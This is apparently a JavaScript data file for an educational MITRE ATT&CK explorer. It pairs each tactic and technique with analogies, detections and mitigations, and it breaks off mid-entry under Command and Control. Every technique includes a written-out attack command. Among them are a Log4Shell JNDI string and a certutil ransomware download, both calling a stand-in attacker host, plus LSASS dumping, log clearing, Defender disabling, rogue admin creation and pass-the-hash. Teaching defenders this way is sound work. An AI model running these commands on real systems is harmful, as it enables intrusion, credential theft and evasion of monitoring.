// Complete MITRE ATT&CK Enterprise Framework Data
// Covering all 14 Tactics (TA0043 to TA0040) with Core Techniques, Analogies, and Detections

export const MITRE_TACTICS = [
  {
    id: "TA0043",
    order: 1,
    name: "Reconnaissance",
    shortName: "Recon",
    icon: "binoculars",
    color: "#38bdf8", // Sky blue
    glowColor: "rgba(56, 189, 248, 0.4)",
    adversaryGoal: "Gather information to plan future adversary operations.",
    analogy: "Like a burglar driving through a neighborhood, noting which houses have security cameras, open gates, or dog warning signs.",
    description: "Adversaries actively or passively search for details about target organizations, systems, credentials, email addresses, network topology, and infrastructure vulnerabilities before launching an intrusion.",
    techniques: [
      {
        id: "T1595",
        name: "Active Scanning",
        subTechnique: "T1595.001 (Port Scans), T1595.002 (Vulnerability Scans)",
        summary: "Probing target IP blocks with automated tools (Nmap, Masscan, Nuclei) to discover open ports, exposed services, and unpatched CVEs.",
        adversaryUsage: "Attacker scans 198.51.100.0/24 finding port 443 (VPN gateway) running outdated FortiOS or Citrix ADC software.",
        commandExample: "nmap -sS -sV -T4 -p 1-65535 198.51.100.24",
        detection: "High volume of SYN packets with no handshake completion, WAF/firewall connection rate anomalies, honeypot probes.",
        mitigation: "Minimize exposed services, block unauthorized ASN scan ranges, place edge appliances behind CDN/WAF with rate limiting."
      },
      {
        id: "T1589",
        name: "Gather Victim Identity Information",
        subTechnique: "T1589.002 (Email Addresses), T1589.003 (Employee Names)",
        summary: "Harvesting organizational employee names, roles, executive hierarchies, and email formats from LinkedIn, company press releases, and breach dumps.",
        adversaryUsage: "Scraping Apex Corp's CFO and IT Helpdesk staff emails to prepare a targeted spear-phishing pretext.",
        commandExample: "theHarvester -d targetcompany.com -b linkedin,google",
        detection: "Monitoring web scraping on corporate portals, threat intelligence notifications of company emails on breached dark-web forums.",
        mitigation: "Train personnel on OSINT hygiene, mask internal contact directories, enforce external email warning banners."
      },
      {
        id: "T1593",
        name: "Search Open Websites/Domains",
        subTechnique: "T1593.001 (Social Media), T1593.002 (Search Engines)",
        summary: "Leveraging Google Dorking, GitHub public repositories, and Shodan/Censys to find leaked API keys, credentials, or architectural blueprints.",
        adversaryUsage: "Locating AWS S3 bucket names and leaked Terraform configs in a developer's forgotten public GitHub repo.",
        commandExample: 'site:github.com "targetcompany.com" "password" OR "API_KEY"',
        detection: "Automated Git repository scanning (GitGuardian/TruffleHog), continuous external attack surface management (EASM).",
        mitigation: "Enforce secret scanning in CI/CD pipelines, immediate credential rotation policies, strict cloud asset naming standards."
      }
    ],
    redVsBlue: {
      redAction: "Run stealth SYN scan against perimeter firewall to map exposed endpoints.",
      blueCounter: "Enable perimeter behavioral rate-limiting and auto-block scanning IP subnet."
    }
  },
  {
    id: "TA0042",
    order: 2,
    name: "Resource Development",
    shortName: "Resource Dev",
    icon: "server",
    color: "#818cf8", // Indigo
    glowColor: "rgba(129, 140, 248, 0.4)",
    adversaryGoal: "Establish infrastructure, accounts, and tools to support attack operations.",
    analogy: "Purchasing counterfeit IDs, buying untraceable burner phones, and renting an unmarked getaway van before committing a heist.",
    description: "The adversary creates, purchases, or compromises physical or virtual assets—such as C2 domains, VPS servers, SSL certificates, botnet nodes, and crafted malicious payloads—needed to execute their campaign.",
    techniques: [
      {
        id: "T1583",
        name: "Acquire Infrastructure",
        subTechnique: "T1583.001 (Domains), T1583.003 (VPS)",
        summary: "Purchasing look-alike typosquatting domains (e.g. apex-supp0rt.com) and renting bulletproof VPS instances using cryptocurrency.",
        adversaryUsage: "Adversary registers apex-login-portal.net and spins up cloud VPS in an offshore jurisdiction to host phishing landing pages.",
        commandExample: "curl -X POST https://api.registrar.com/register -d domain=apex-auth.com",
        detection: "Passive DNS newly-registered domain (NRD) alerts, WHOIS anomalies, categorization as newly observed domain (NOD).",
        mitigation: "Preemptively register brand typosquats, block outbound web browsing to domains registered under 30 days old."
      },
      {
        id: "T1587",
        name: "Develop Capabilities",
        subTechnique: "T1587.001 (Malware), T1587.004 (Exploits)",
        summary: "Writing custom payloads, loaders, obfuscated PowerShell scripts, or packaging known Cobalt Strike/Brute Ratel beacons.",
        adversaryUsage: "Threat actor compiles a custom Golang reverse shell with sleep-obfuscation and sandbox-evasion routines.",
        commandExample: "go build -ldflags=\"-s -w -H=windowsgui\" -o update_agent.exe agent.go",
        detection: "Threat intel sharing feeds, static YARA matching during payload distribution staging, repository monitoring.",
        mitigation: "Robust endpoint behavioral protection, blocking unsigned binaries via AppLocker / WDAC."
      },
      {
        id: "T1588",
        name: "Obtain Capabilities",
        subTechnique: "T1588.002 (Tool), T1588.005 (Exploits)",
        summary: "Purchasing commercial penetration testing tools (Cobalt Strike), leaked 0-day/N-day exploits, or initial access broker (IAB) combos.",
        adversaryUsage: "Purchasing cracked Cobalt Strike Team Server and an unpatched VPN remote-code-execution exploit on illicit forums.",
        commandExample: "git clone https://github.com/adversary-tools/cobalt-profile.git",
        detection: "Monitoring dark web criminal forums, threat intelligence IOC feeds for pirated software watermarks.",
        mitigation: "Rapid vulnerability patch management, zero-trust perimeter verification."
      }
    ],
    redVsBlue: {
      redAction: "Register lookalike domain 'apex-mfa-verify.com' with valid Let's Encrypt SSL.",
      blueCounter: "Enforce Newly Registered Domain (NRD) blocking policy across corporate Secure Web Gateway (SWG)."
    }
  },
  {
    id: "TA0001",
    order: 3,
    name: "Initial Access",
    shortName: "Initial Access",
    icon: "door-open",
    color: "#f59e0b", // Amber
    glowColor: "rgba(245, 158, 11, 0.4)",
    adversaryGoal: "Gain an initial foothold into the target network.",
    analogy: "Picking the front door lock or tricking an employee into buzzing a delivery impostor into the secure lobby.",
    description: "Techniques used to get their foot in the door. These include exploiting edge-facing web servers, sending targeted spear-phishing emails with malicious attachments, or using stolen VPN credentials.",
    techniques: [
      {
        id: "T1566",
        name: "Phishing",
        subTechnique: "T1566.001 (Attachment), T1566.002 (Spearphishing Link)",
        summary: "Sending deceptive emails disguised as urgent invoices, salary updates, or IT notifications to coerce users into opening attachments or clicking links.",
        adversaryUsage: "Spear-phishing email sent to Finance employee containing 'Q4_Bonus_Schedule.xlsx.iso' disguised as a spreadsheet.",
        commandExample: "sendmail -t finance-dept@victim.com -f hr-announcements@apex-auth.com",
        detection: "Secure Email Gateway (SEG) sandboxing, SPF/DKIM/DMARC failures, user-reported suspicious email submissions.",
        mitigation: "FIDO2 hardware MFA tokens (phishing-resistant), anti-spoofing email protocols, recurring interactive user simulation drills."
      },
      {
        id: "T1190",
        name: "Exploit Public-Facing Application",
        subTechnique: "N/A",
        summary: "Exploiting security bugs (e.g., Log4Shell, ProxyLogon, Atlassian Confluence RCE) in web servers, firewalls, or internet-facing gateways.",
        adversaryUsage: "Sending malicious JNDI LDAP lookup strings to vulnerable Log4j server to trigger remote code execution without authentication.",
        commandExample: "curl -H 'X-Api-Version: ${jndi:ldap://c2.attacker.com/payload}' https://vpn.victim.com",
        detection: "WAF signature alerts, anomalous outbound LDAP/RMI connections from edge servers, unexpected web-server child process spawns.",
        mitigation: "Strict vulnerability management, edge microsegmentation, placing sensitive management portals behind Zero Trust Network Access (ZTNA)."
      },
      {
        id: "T1078",
        name: "Valid Accounts",
        subTechnique: "T1078.004 (Cloud Accounts)",
        summary: "Using legitimate credentials obtained via infostealer logs, credential stuffing, or purchasing from access brokers to log straight into VPN or SSO.",
        adversaryUsage: "Logging into Victim's Microsoft 365 tenant using credentials stolen by RedLine Stealer from an employee's personal PC.",
        commandExample: "Connect-AzAccount -Credential $stolenCreds -TenantId $targetTenant",
        detection: "Impossible travel alerts, unusual login geolocation, unfamiliar User-Agent strings, access outside normal business hours.",
        mitigation: "Phishing-resistant MFA, conditional access policies based on device health and IP reputation."
      }
    ],
    redVsBlue: {
      redAction: "Transmit spearphishing email with weaponized SVG/OneNote attachment.",
      blueCounter: "Email Sandbox quarantines message due to nested script heuristic; triggers SOC SOC triage."
    }
  },
  {
    id: "TA0002",
    order: 4,
    name: "Execution",
    shortName: "Execution",
    icon: "terminal",
    color: "#ef4444", // Bright Red
    glowColor: "rgba(239, 68, 68, 0.4)",
    adversaryGoal: "Run malicious code on a local or remote target system.",
    analogy: "Unfolding the burglar toolkit inside the house and turning on the power drill to open the lockbox.",
    description: "Techniques that result in adversary-controlled code running on a local or remote system. Adversaries often pair execution with other tactics, such as using command interpreters to run scripts or inject code into trusted processes.",
    techniques: [
      {
        id: "T1059",
        name: "Command and Scripting Interpreter",
        subTechnique: "T1059.001 (PowerShell), T1059.003 (Windows Command Shell)",
        summary: "Executing commands and malicious payloads directly inside built-in system shells like PowerShell, CMD, Bash, or Python.",
        adversaryUsage: "Running encoded PowerShell to download a secondary payload straight into memory without touching disk.",
        commandExample: "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAA...",
        detection: "PowerShell Script Block Logging (Event ID 4104), process tree monitoring (e.g. WINWORD.EXE spawning powershell.exe).",
        mitigation: "Constrained Language Mode, PowerShell version 2 uninstallation, AppLocker script rules restricting script directories."
      },
      {
        id: "T1204",
        name: "User Execution",
        subTechnique: "T1204.002 (Malicious File)",
        summary: "Tricking the victim user into double-clicking a malicious shortcut (.lnk), mounting an ISO container, or enabling Office macros.",
        adversaryUsage: "Victim double-clicks 'Invoice.pdf.lnk' masquerading as an Adobe PDF document with a PDF icon.",
        commandExample: "explorer.exe Q4_Report.iso -> payload.lnk launches cmd.exe",
        detection: "Monitoring MOTW (Mark of the Web) bypasses, execution of untrusted binaries from user Downloads or Temp directory.",
        mitigation: "Disable default Windows mounting of VHD/ISO files, block macro execution from internet sources via Group Policy."
      },
      {
        id: "T1047",
        name: "Windows Management Instrumentation (WMI)",
        subTechnique: "N/A",
        summary: "Using Windows Management Instrumentation to interact with local or remote systems and execute processes stealthily.",
        adversaryUsage: "Adversary uses WMI to remotely spawn a beacon process on a finance database server.",
        commandExample: "wmic /node:192.168.1.50 process call create 'powershell.exe -enc ...'",
        detection: "WMI-Activity Event log (Event ID 5861), Sysmon Event ID 19/20/21 (WmiEventFilter / Consumer / Binding).",
        mitigation: "Restrict remote WMI access via host firewalls, restrict local administrator rights on workstations."
      }
    ],
    redVsBlue: {
      redAction: "LNK shortcut launches obfuscated PowerShell command to download memory payload.",
      blueCounter: "EDR intercepts anomalous Word-to-PowerShell child process invocation and kills parent process tree."
    }
  },
  {
    id: "TA0003",
    order: 5,
    name: "Persistence",
    shortName: "Persistence",
    icon: "anchor",
    color: "#ec4899", // Pink
    glowColor: "rgba(236, 72, 153, 0.4)",
    adversaryGoal: "Maintain their foothold across system restarts and credential resets.",
    analogy: "Leaving a hidden back window unlatched or hiding a spare key under the garden stone so they can return anytime.",
    description: "Techniques used to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Adversaries plant startup keys, scheduled tasks, and accounts.",
    techniques: [
      {
        id: "T1053",
        name: "Scheduled Task/Job",
        subTechnique: "T1053.005 (Scheduled Task)",
        summary: "Creating automated tasks via schtasks.exe, Cron, or systemd timers that execute malicious beacons on a regular heartbeat or at reboot.",
        adversaryUsage: "Adversary creates a hidden task 'WindowsUpdateCore' set to run beacon.exe every 60 minutes as SYSTEM.",
        commandExample: 'schtasks /create /tn "WindowsUpdateCore" /tr "C:\\ProgramData\\svc.exe" /sc HOURLY /ru "SYSTEM"',
        detection: "Security Event Log Event ID 4698 (A scheduled task was created), Sysmon Event ID 1 (schtasks.exe process creation).",
        mitigation: "Audit scheduled task registrations, restrict task creation permissions, enforce code integrity on binaries."
      },
      {
        id: "T1547",
        name: "Boot or Logon Autostart Execution",
        subTechnique: "T1547.001 (Registry Run Keys / Startup Folder)",
        summary: "Adding an entry to the Windows Registry Run key (HKCU/HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run) so code starts when the user logs in.",
        adversaryUsage: "Writing an entry to HKCU Run key disguised as 'OneDrive Sync Helper' pointing to backdoor payload.",
        commandExample: 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "OneDriveSync" /t REG_SZ /d "C:\\Temp\\agent.exe" /f',
        detection: "Sysmon Event ID 12/13 (Registry object added or modified), Autoruns baseline audits.",
        mitigation: "Lock down registry permissions, run periodic Autoruns differential scans across workstation fleets."
      },
      {
        id: "T1136",
        name: "Create Account",
        subTechnique: "T1136.001 (Local Account), T1136.002 (Domain Account)",
        summary: "Creating rogue local administrator or Active Directory accounts to retain access if existing credentials are changed.",
        adversaryUsage: "Creating a stealth local admin user 'svc-backup' with a hardcoded password on a compromised jump host.",
        commandExample: "net user svc-backup Password123! /add && net localgroup administrators svc-backup /add",
        detection: "Windows Event ID 4720 (User account was created), Event ID 4728 (Member added to security-enabled global group).",
        mitigation: "Strict IAM auditing, automated decommission of unauthorized local accounts via PAM (Privileged Access Management)."
      }
    ],
    redVsBlue: {
      redAction: "Create a disguised Scheduled Task 'WindowsTelemetryAgent' running every hour.",
      blueCounter: "SIEM rule triggers on Event ID 4698 containing unusual binary path in ProgramData."
    }
  },
  {
    id: "TA0004",
    order: 6,
    name: "Privilege Escalation",
    shortName: "Priv Escalation",
    icon: "shield-alert",
    color: "#f97316", // Orange
    glowColor: "rgba(249, 115, 22, 0.4)",
    adversaryGoal: "Gain higher-level permissions on systems or networks.",
    analogy: "The burglar finds the master key ring inside a desk drawer, upgrading from guest access to full building manager master keys.",
    description: "Techniques used to gain higher-level permissions on a system or network. Adversaries enter as standard users and escalate to local SYSTEM, root, or Domain Admin via exploit or misconfiguration.",
    techniques: [
      {
        id: "T1068",
        name: "Exploitation for Privilege Escalation",
        subTechnique: "N/A",
        summary: "Exploiting OS kernel vulnerabilities (e.g. Win32k, Dirty Pipe, CVE-2024-XXXX) to jump from standard user rights to NT AUTHORITY\\SYSTEM.",
        adversaryUsage: "Running a local kernel exploit proof-of-concept to overwrite token privileges in kernel space.",
        commandExample: "./kernel_exploit.exe --target win11-22h2",
        detection: "EDR memory scanning detecting shellcode injection into system threads, token privilege modification alerts.",
        mitigation: "Rapid OS security update cycles, Virtualization-Based Security (VBS), Credential Guard."
      },
      {
        id: "T1548",
        name: "Abuse Elevation Control Mechanism",
        subTechnique: "T1548.002 (Bypass User Account Control - UAC)",
        summary: "Bypassing Windows UAC prompt using auto-elevating binaries (like fodhelper.exe or computerdefaults.exe) to run commands silently as admin.",
        adversaryUsage: "Hijacking Registry keys read by fodhelper.exe to launch an elevated cmd.exe without displaying a UAC consent dialog.",
        commandExample: 'reg add "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command" /v "DelegateExecute" /f',
        detection: "Sysmon Event ID 1 (fodhelper.exe spawning cmd.exe or powershell.exe), unusual registry writes to ms-settings.",
        mitigation: "Set UAC to 'Always Notify', eliminate local administrator rights for standard daily workstation users."
      },
      {
        id: "T1055",
        name: "Process Injection",
        subTechnique: "T1055.001 (DLL Injection), T1055.012 (Process Hollowing)",
        summary: "Injecting malicious shellcode into memory space of legitimate running processes (like explorer.exe or svchost.exe) to inherit their privileges.",
        adversaryUsage: "Allocating RWX memory in spoolsv.exe via VirtualAllocEx and launching a thread with CreateRemoteThread.",
        commandExample: "Invoke-ReflectivePEInjection -ProcessId 1844 -PEPath C:\\Temp\\beacon.dll",
        detection: "Sysmon Event ID 8 (CreateRemoteThread detected), EDR detecting cross-process memory allocations and unbacked executable memory.",
        mitigation: "Enable Exploit Protection (CFG, ASLR, DEP), Arbitrary Code Guard (ACG) on sensitive processes."
      }
    ],
    redVsBlue: {
      redAction: "Execute UAC bypass via fodhelper registry hijack to spawn elevated command shell.",
      blueCounter: "Behavioral EDR blocks registry write to ms-settings protocol handler from non-standard process."
    }
  },
  {
    id: "TA0005",
    order: 7,
    name: "Defense Evasion",
    shortName: "Defense Evasion",
    icon: "eye-off",
    color: "#a855f7", // Violet
    glowColor: "rgba(168, 85, 247, 0.4)",
    adversaryGoal: "Avoid detection and bypass security defenses throughout their campaign.",
    analogy: "Wearing gloves to avoid fingerprints, spraying spray-paint over the security cameras, and wearing employee uniforms as a disguise.",
    description: "Techniques used by adversaries to avoid being detected throughout their intrusion. This includes uninstalling/disabling antivirus, deleting logs, packing and encrypting malware, or masquerading as legitimate system files.",
    techniques: [
      {
        id: "T1562",
        name: "Impair Defenses",
        subTechnique: "T1562.001 (Disable or Modify Tools)",
        summary: "Terminating security agent processes, unloading EDR kernel drivers using BYOVD (Bring Your Own Vulnerable Driver), or disabling AMSI.",
        adversaryUsage: "Using a vulnerable signed anti-cheat driver to terminate Microsoft Defender and CrowdStrike Falcon agents.",
        commandExample: "sc stop WinDefend && Set-MpPreference -DisableRealtimeMonitoring $true",
        detection: "Windows Security Event ID 7036 (Service entered stopped state), Defender Tamper Protection trigger alerts.",
        mitigation: "Enable Tamper Protection, enforce driver blocklists (HVCI / Microsoft Recommended Driver Block Rules)."
      },
      {
        id: "T1070",
        name: "Indicator Removal",
        subTechnique: "T1070.001 (Clear Windows Event Logs)",
        summary: "Clearing security, system, and application event logs or wiping bash history to erase forensic artifacts of their presence.",
        adversaryUsage: "Adversary clears the Windows Security event log to wipe failed logon and privilege escalation events.",
        commandExample: "wevtutil cl Security && wevtutil cl System && wevtutil cl Application",
        detection: "Windows Event ID 1102 (The audit log was cleared), Sysmon Event ID 1 (wevtutil.exe execution with cl argument).",
        mitigation: "Stream event logs in real-time to an immutable remote SIEM / cloud data lake; alert immediately on Event 1102."
      },
      {
        id: "T1036",
        name: "Masquerading",
        subTechnique: "T1036.005 (Match Legitimate Name or Location)",
        summary: "Renaming malicious binaries to legitimate system names (e.g. svch0st.exe or teams.exe) and placing them in Windows\\System32.",
        adversaryUsage: "Placing malware named 'taskhostw.exe' in 'C:\\Users\\Public\\' to blend into Task Manager process lists.",
        commandExample: "copy beacon.exe C:\\Users\\Public\\taskhostw.exe",
        detection: "Path anomaly checks (taskhostw.exe running outside System32), missing valid digital signatures from Microsoft.",
        mitigation: "Application whitelisting (WDAC) enforcing signature verification for all binaries."
      }
    ],
    redVsBlue: {
      redAction: "Adversary attempts to run wevtutil cl Security to erase forensic trace.",
      blueCounter: "SIEM receives immutable real-time log event 1102; SOAR automatically isolates workstation from network."
    }
  },
  {
    id: "TA0006",
    order: 8,
    name: "Credential Access",
    shortName: "Credential Access",
    icon: "key",
    color: "#eab308", // Yellow
    glowColor: "rgba(234, 179, 8, 0.4)",
    adversaryGoal: "Steal account names and passwords.",
    analogy: "Rummaging through desk drawers, finding sticky notes with passwords, and breaking into the office key safe.",
    description: "Techniques for stealing credentials like account names and passwords. Techniques include dumping LSASS memory (Mimikatz), Kerberoasting Active Directory service accounts, and reading browser-saved passwords.",
    techniques: [
      {
        id: "T1003",
        name: "OS Credential Dumping",
        subTechnique: "T1003.001 (LSASS Memory), T1003.002 (Security Account Manager - SAM)",
        summary: "Extracting plaintext credentials, Kerberos tickets, and NTLM password hashes directly from the Local Security Authority Subsystem Service (LSASS).",
        adversaryUsage: "Running procdump.exe or Mimikatz sekurlsa::logonpasswords against lsass.exe to dump domain admin hashes.",
        commandExample: "procdump.exe -ma lsass.exe C:\\Temp\\lsass.dmp",
        detection: "Sysmon Event ID 10 (Process access to lsass.exe with PROCESS_VM_READ permissions), EDR LSASS memory protection tripwires.",
        mitigation: "Enable Windows Defender Credential Guard (virtualization-based security), configure LSA Protection (RunAsPPL)."
      },
      {
        id: "T1558",
        name: "Steal or Forge Kerberos Tickets",
        subTechnique: "T1558.003 (Kerberoasting)",
        summary: "Requesting Service Principal Name (SPN) Kerberos TGS tickets from Active Directory and cracking their RC4/AES hashes offline to crack passwords.",
        adversaryUsage: "Requesting TGS tickets for MSSQL service accounts and cracking them offline with Hashcat.",
        commandExample: "powershell -c \"Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/db01.corp'\"",
        detection: "Windows Event ID 4769 (A Kerberos service ticket was requested with encryption type 0x17 - RC4), anomalous ticket volume per user.",
        mitigation: "Use Group Managed Service Accounts (gMSA) with random 128-character passwords; disable RC4 encryption in Kerberos."
      },
      {
        id: "T1552",
        name: "Unsecured Credentials",
        subTechnique: "T1552.001 (Credentials in Files)",
        summary: "Searching local hard drives, scripts, config files, and network shares for unencrypted passwords (e.g., web.config, unattend.xml).",
        adversaryUsage: "Grepping for 'password=' in all .config and .bat files on mapped department network shares.",
        commandExample: 'findstr /si "password" C:\\Users\\*\\*.txt *.xml *.config',
        detection: "File integrity monitoring, canary honey-tokens containing fake credentials placed in decoy files.",
        mitigation: "Secrets management vaults (HashiCorp Vault, Azure Key Vault), enforce policy prohibiting plaintext credentials."
      }
    ],
    redVsBlue: {
      redAction: "Request RC4 Kerberos TGS tickets for all registered SPNs (Kerberoasting).",
      blueCounter: "Active Directory Honey-SPN triggered; account instantly flagged, alert dispatched to SOC analysts."
    }
  },
  {
    id: "TA0007",
    order: 9,
    name: "Discovery",
    shortName: "Discovery",
    icon: "compass",
    color: "#06b6d4", // Cyan
    glowColor: "rgba(6, 182, 212, 0.4)",
    adversaryGoal: "Observe the environment, orient themselves, and decide where to go next.",
    analogy: "Reading the floor map inside the building, finding out where the vault room and server closet are located.",
    description: "Techniques an adversary uses to gain knowledge about the system and internal network. They run built-in commands to see who is logged in, what network shares exist, what domain trusts are active, and what security software is present.",
    techniques: [
      {
        id: "T1087",
        name: "Account Discovery",
        subTechnique: "T1087.002 (Domain Account)",
        summary: "Enumerating local and domain accounts, group memberships, and Domain Admins using native utilities or BloodHound.",
        adversaryUsage: "Running 'net group \"Domain Admins\" /domain' to identify the highest-privileged domain accounts in the forest.",
        commandExample: "net group \"Domain Admins\" /domain",
        detection: "Rapid execution of native discovery commands (net.exe, whoami.exe, nltest.exe) within seconds of initial compromise.",
        mitigation: "Apply Active Directory Tiered Administrative model; restrict standard users from querying sensitive group memberships."
      },
      {
        id: "T1018",
        name: "Remote System Discovery",
        subTechnique: "N/A",
        summary: "Finding other machines on the network, such as domain controllers, file servers, hypervisors, and backup storage arrays.",
        adversaryUsage: "Executing nltest /dclist:corp.local to identify primary Domain Controllers in the domain.",
        commandExample: "nltest /dclist:apexcorp.local",
        detection: "Broad ICMP sweeps or ARP scans from user workstations, high volume of DNS lookups for domain hosts.",
        mitigation: "Workstation-to-workstation network isolation (PVLANs), zero trust microsegmentation."
      },
      {
        id: "T1082",
        name: "System Information Discovery",
        subTechnique: "N/A",
        summary: "Gathering detailed OS version, architecture, patch levels, hardware specs, and domain name from the compromised host.",
        adversaryUsage: "Running systeminfo to inspect hotfixes and determine which privilege escalation CVEs are unpatched.",
        commandExample: "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"Hotfix(s)\"",
        detection: "Process lineage tracking (systeminfo called by non-interactive service or script interpreter).",
        mitigation: "Standard hardening, automated patch deployment to ensure zero unpatched hotfixes exist."
      }
    ],
    redVsBlue: {
      redAction: "Adversary runs whoami /all, net accounts /domain, and BloodHound SharpHound collector.",
      blueCounter: "BloodHound Active Directory Canary detects anomalous bulk LDAP directory queries from non-admin endpoint."
    }
  },
  {
    id: "TA0008",
    order: 10,
    name: "Lateral Movement",
    shortName: "Lateral Movement",
    icon: "arrow-right-left",
    color: "#10b981", // Emerald
    glowColor: "rgba(16, 185, 129, 0.4)",
    adversaryGoal: "Extend access across multiple systems on the internal network.",
    analogy: "Walking down the hallways using the stolen master key, unlocking the executive offices and the secure records room.",
    description: "Techniques used by adversaries to enter and control remote systems on a network. Adversaries move from an initial workstation to high-value file servers, database servers, and domain controllers using RDP, SMB, SSH, or WinRM.",
    techniques: [
      {
        id: "T1021",
        name: "Remote Services",
        subTechnique: "T1021.001 (Remote Desktop Protocol - RDP), T1021.002 (SMB/Windows Admin Shares)",
        summary: "Connecting to remote machines using administrative protocols like RDP, SSH, or SMB administrative shares (C$, ADMIN$).",
        adversaryUsage: "Using stolen Domain Admin credentials to connect via RDP to the primary Domain Controller.",
        commandExample: "mstsc.exe /v:192.168.1.10",
        detection: "Windows Event ID 4624 (Logon Type 10 - RemoteInteractive, Logon Type 3 - Network), workstation-to-workstation RDP connections.",
        mitigation: "Block workstation-to-workstation traffic with host firewalls; require jump servers with MFA for RDP/SSH access."
      },
      {
        id: "T1570",
        name: "Lateral Tool Transfer",
        subTechnique: "N/A",
        summary: "Copying tools, scripts, or secondary beacons from one compromised internal system to another to extend operational capability.",
        adversaryUsage: "Copying payload 'svc_runner.exe' to remote server via SMB share \\\\Server02\\C$\\Windows\\Temp\\.",
        commandExample: "copy C:\\Temp\\agent.exe \\\\192.168.1.55\\C$\\Windows\\Temp\\agent.exe",
        detection: "SMB file write events to ADMIN$ or C$ shares followed immediately by service creation or scheduled task.",
        mitigation: "Disable SMBv1, enforce SMB signing and encryption, audit administrative share file writes."
      },
      {
        id: "T1550",
        name: "Use Alternate Authentication Material",
        subTechnique: "T1550.002 (Pass the Hash - PtH)",
        summary: "Authenticating to remote servers using extracted NTLM password hashes without ever needing to know or crack the plaintext password.",
        adversaryUsage: "Using crackmapexec / netexec to pass an admin NTLM hash across all subnets to locate administrative access.",
        commandExample: "nxc smb 192.168.1.0/24 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0",
        detection: "Event ID 4624 with NTLM authentication when Kerberos is expected; anomalous NTLM usage across domain-joined servers.",
        mitigation: "Disable NTLM in Active Directory (enforce Kerberos only); enable Protected Users security group."
      }
    ],
    redVsBlue: {
      redAction: "Pass-the-Hash execution to pivot from HR laptop to Domain Controller over SMB.",
      blueCounter: "Internal network segmentation blocks lateral SMB port 445 between workstation subnets."
    }
  },
  {
    id: "TA0009",
    order: 11,
    name: "Collection",
    shortName: "Collection",
    icon: "archive",
    color: "#14b8a6", // Teal
    glowColor: "rgba(20, 184, 166, 0.4)",
    adversaryGoal: "Gather target data of interest (intel, secrets, customer records) to achieve their mission.",
    analogy: "Gathering diamond necklaces, financial ledger books, and gold bullion into a duffle bag.",
    description: "Techniques used to accumulate data of interest, such as sensitive intellectual property, emails, financial records, customer PII, or database dumps, and preparing it for extraction.",
    techniques: [
      {
        id: "T1560",
        name: "Archive Collected Data",
        subTechnique: "T1560.001 (Archive via Utility - 7-Zip, WinRAR)",
        summary: "Compressing and encrypting stolen documents into password-protected ZIP, 7z, or RAR archives to bundle them and evade DLP filters.",
        adversaryUsage: "Adversary uses 7-Zip command-line to compress the entire Finance share into an encrypted multi-part archive.",
        commandExample: '7z.exe a -tzip -pSecretKey2026! -mem=AES256 "C:\\Temp\\exfil.zip" "D:\\Apex_Financial_Records\\*"',
        detection: "High disk read volume on network shares followed by invocation of 7z.exe or rar.exe with password arguments (-p).",
        mitigation: "Data Loss Prevention (DLP) tools monitoring archive creation, file access auditing on sensitive file shares."
      },
      {
        id: "T1005",
        name: "Data from Local System",
        subTechnique: "N/A",
        summary: "Searching and copying valuable sensitive files directly from local storage, desktops, and mapped network drives.",
        adversaryUsage: "Script iterating through C:\\Users\\*\\Documents searching for .docx, .xlsx, and .pdf containing proprietary IP.",
        commandExample: "Get-ChildItem -Path C:\\Users\\ -Recurse -Include *.xlsx,*.pdf | Copy-Item -Destination C:\\Temp\\Staging\\",
        detection: "Anomalous spike in mass file reads outside normal working hours by a single process.",
        mitigation: "Principle of least privilege on data shares, automated file encryption for sensitive intellectual property."
      },
      {
        id: "T1114",
        name: "Email Collection",
        subTechnique: "T1114.002 (Remote Email Collection via M365/Exchange)",
        summary: "Extracting executive email inboxes, attachments, and calendar invites via Exchange Web Services (EWS) or Microsoft Graph API.",
        adversaryUsage: "Exporting CEO mailbox to a PST file or dumping emails containing the keyword 'merger' or 'acquisition'.",
        commandExample: "New-MailboxExportRequest -Mailbox 'ceo@apexcorp.com' -FilePath '\\\\exfil_share\\pst\\ceo.pst'",
        detection: "Exchange Admin Audit Logs (New-MailboxExportRequest), sudden mass downloads of emails via Graph API.",
        mitigation: "Restrict Mailbox Export rights, require multi-admin approval for bulk mailbox export requests."
      }
    ],
    redVsBlue: {
      redAction: "Compress 50GB of customer databases into password-protected multi-volume 7z archive.",
      blueCounter: "DLP agent detects high-speed bulk archive creation with command-line encryption flag and flags process."
    }
  },
  {
    id: "TA0011",
    order: 12,
    name: "Command and Control",
    shortName: "Command & Control",
    icon: "radio",
    color: "#6366f1", // Indigo / Blue
    glowColor: "rgba(99, 102, 241, 0.4)",
    adversaryGoal: "Communicate with compromised systems to control them remotely.",
    analogy: "The burglar radioing their team leader over an encrypted walkie-talkie channel to receive instructions.",
    description: "Techniques used by adversaries to establish a bidirectional covert communications channel with systems under their control. This enables remote command dispatch, status beacons, and data routing.",
    techniques: [
      {
        id: "T1071",
        name: "Application Layer Protocol",
        subTechnique: "T1071.001 (Web Protocols - HTTPS), T1071.004 (DNS Tunneling)",
        summary: "Blown beacon traffic disguised as ordinary HTTPS browsing or tunneling commands inside innocuous DNS queries.",
        adversaryUsage: "Beacon sends regular HTTPS POST requests to legitimate-looking cloud CDN edge endpoints mimicking Microsoft telemetry.",
        commandExample: "POST https://cdn-telemetry-service.net/v1/update HTTP/1.1 (Payload encoded in Cookie header)",
        detection: "Beacon jitter analysis (regular intervals), high entropy in DNS query subdomains, JA3/JA4 TLS fingerprint matching.",
        mitigation: "SSL/TLS inspection on outbound egress proxies, strict DNS firewall filtering looking for high-entropy queries."
      },
      {
        id: "T1105",
        name: "Ingress Tool Transfer",
        subTechnique: "N/A",
        summary: "Transferring tools or other files from an external system (such as attacker C2 or GitHub) into the compromised network.",
        adversaryUsage: "Using certutil.exe or curl to download secondary ransomware binaries directly to the victim workstation.",
        commandExample: "certutil.exe -urlcache -split -f https://c2.attacker.com/ransom.exe C:\\Temp\\ransom.exe",
        detection: "Sysmon Event ID 1 (certutil.exe with -urlcache or curl.exe downloading executables), proxy download logs.",
